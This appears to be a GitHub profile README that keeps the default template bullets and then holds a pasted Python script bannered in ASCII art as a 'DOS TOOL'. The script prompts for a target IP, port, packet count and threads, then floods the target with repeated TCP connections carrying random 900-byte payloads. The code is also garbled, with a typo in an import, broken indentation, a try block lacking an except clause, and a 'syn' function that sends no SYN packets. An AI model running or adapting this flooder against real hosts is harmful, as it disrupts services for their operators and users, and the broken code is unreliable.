- 👋 Hi, I’m @nguyenvanloi-start
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
nguyenvanloi-start/nguyenvanloi-start is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview tôilink to take a look at your changes.
--->
import random
import threading
import socket
import os
import time
from termcolor import coloredcolored


'||'''|.              \\      // '||` 
 ||   ||               \\    //   ||  
 ||   || .|''|, (''''   \\  //    ||  
 ||   || ||  ||  `'')    \\//     ||  
.||...|' `|..|' `...'     \/     .||. 

 



                    TOOL
   		
	
		
ip = str(input(colored("[+] IP: ", 'green')))
port = int(input(colored("[+] Port: ", 'green')))
packet = int(input(colored("[+] Packets: ", 'green')))
thread = int(input(colored("[+] Threads: ", 'green')))
time.sleep(1.5) 

def syn():
	
   hevin = random._urandom(900)
   bb = int(0)
      while True:
      	try:
		
		
		
		
      	      h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                h.connect((ip,port))
                h.send(hevin)
                for i in range(packet):
                      h.send(hevin)
                 bb += 1
                 print(colored('[+] Attacking '+ip +'>>>Sent: '+str(bb), 'red' )) 
                 h.close()
                 print(colored("[+++] DONE !!!!", 'green' ))
                 pass

for b in range(thread):
	  thread = threading.Thread(target=syn)
	  thread.start()
